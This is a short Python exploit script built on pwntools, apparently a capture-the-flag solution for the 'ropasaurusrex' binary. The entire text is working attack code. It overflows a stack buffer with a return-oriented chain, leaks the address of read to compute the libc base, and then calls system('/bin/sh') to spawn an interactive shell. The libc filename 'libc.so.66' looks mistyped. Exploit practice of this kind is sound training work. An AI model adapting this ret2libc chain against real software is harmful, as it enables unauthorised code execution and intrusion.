from pwn import *

p = process('./ropasaurusrex')

rop = ELF('./ropasaurusrex')
libc = ELF('./libc.so.66')
write_plt = rop.plt['write']
read_plt = rop.plt['read']
read_got = rop.got['read']
read_func = 0x080483F4
pop3_ret = 0x080484b6
pop_ebx = 0x080483c3
# write(1, "WIN\n", 4u)

payload = flat(
    ['a' * 0x8c, write_plt, pop3_ret, 0x1, read_got, 0x4, read_func]
)
p.sendline(payload)
read_addr = u32(p.recv(4))
base_addr = read_addr - libc.symbols['read']
system_addr = base_addr + libc.symbols['system']
binsh_addr = base_addr + next(libc.search('/bin/sh'))

payload = flat(['a' * 0x8c, system_addr, 0xdeadbeef, binsh_addr])
p.sendline(payload)
p.interactive()
p.close()
